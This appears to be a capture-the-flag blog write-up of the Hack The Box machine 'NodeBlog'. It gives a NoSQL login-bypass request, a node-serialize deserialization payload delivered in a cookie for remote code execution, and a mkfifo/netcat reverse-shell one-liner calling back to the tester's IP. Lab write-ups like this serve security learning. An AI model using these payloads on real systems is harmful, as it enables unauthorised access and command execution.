---
title: NodeBlog
date: 2026-08-23
ShowToc: true
draft: false
TocOpen: true
password:
isPrivate: false
tags:
  - blog
  - easy
  - HTB
  - Web-Exploit-NoSQL-login-bypass
  - Web-Exploit-Node-Express-Deserialization-cookie-rce
lastmod: 2026-08-26T06:30:24.323Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/NodeBlog/" >}}

```
┌─[✗]─[tester@parrot]─[~/Desktop/VPN]
└──╼ $nmap 10.129.96.160 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-23 16:55 HKT
Nmap scan report for 10.129.96.160
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   open     ssh
417/tcp  filtered onmux
5000/tcp open     upnp

Nmap done: 1 IP address (1 host up) scanned in 24.74 seconds

```

### Port 5000

### No-Sql Login

{{< toggle "Tag 🏷️" >}}

{{< tag "Web-Exploit-NoSQL-login-bypass" >}} Change Content-Length from x-www-form-urlencoded to json , and the query inquiry  to json request , and it will be attacted by NoSQL syntax {"\$ne": "njkln"}

{{< /toggle >}}

Manual try to change COntent-Type

```
application/json
application/x-www-form-urlencoded
application/form-data
```

![Pasted image 20260825150944.png](/ob/Pasted%20image%2020260825150944.png)

JSON is not working due to the query inquiry

![Pasted image 20260825163916.png](/ob/Pasted%20image%2020260825163916.png)

so I will use www.convertsimple.com/convert-query-string-to-json/ to help me to change to json

![Pasted image 20260825164021.png](/ob/Pasted%20image%2020260825164021.png)

with the password is `{"$ne": "bar"}` then login successful `{"$ne": "bar"}`

![Pasted image 20260825164924.png](/ob/Pasted%20image%2020260825164924.png)

```
POST /login HTTP/1.1
Host: 10.129.96.160:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.96.160:5000/login
Content-Type: application/json
Content-Length: 55
Origin: http://10.129.96.160:5000
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

{
 "user": "admin",
  "password": {"$ne": "njkln"}
}
```

### Web session / cookie analysis

{{< toggle "Tag 🏷️" >}}

{{< tag "Web-Exploit-Node-Express-Deserialization-cookie-rce" >}} Knowing the website is using Nodejs and Express , it may use the package of node-serialize,so if it insecure codes , it will let me have the way to RCE   .

{{< /toggle >}}

We know it is used the Express and Node.js

![Pasted image 20260826104437.png](/ob/Pasted%20image%2020260826104437.png)

Cookie: auth=%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D , so Burp auto decode  will let me to know with URL decode

```
Cookie: auth={"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
```

![Pasted image 20260826104217.png](/ob/Pasted%20image%2020260826104217.png)

### Exploit

Detailed :  https://opsecx.com/blog/exploiting-node-js-deserialization-bug-for-remote-code-execution

In the Local host to install node-serialize for test

```
npm install node-serialize
```

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/NodeBlog]
└──╼ $cat log.js 
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));

```

list the file of Serialized function and try it my host

```
┌─[tester@parrot]─[~/Desktop/HTB/NodeBlog]
└──╼ $cat log.js 
var y = {
rce : function(){
require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
}(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));


┌─[tester@parrot]─[~/Desktop/HTB/NodeBlog]
└──╼ $node log.js
Serialized: 
{}

```

I will make the ping and reverse to cookie to ping me back

```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.14.105', function(error, stdout, stderr){console.log(stdout)});}()"}
```

In the Decoder . rce --> url encode --> put in the cookie

![Pasted image 20260826111542.png](/ob/Pasted%20image%2020260826111542.png)

send it in the repeater .

![Pasted image 20260826111521.png](/ob/Pasted%20image%2020260826111521.png)

Catch it

![Pasted image 20260826111731.png](/ob/Pasted%20image%2020260826111731.png)

### Shell

Used for `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.105 5000 >/tmp/f`

![Pasted image 20260826131438.png](/ob/Pasted%20image%2020260826131438.png)

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/NodeBlog]
└──╼ $nc -lvnp 5000
Listening on 0.0.0.0 5000
Connection received on 10.129.96.160 58814
bash: cannot set terminal process group (876): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

bash: /home/admin/.bashrc: Permission denied
admin@nodeblog:/opt/blog$ 
```
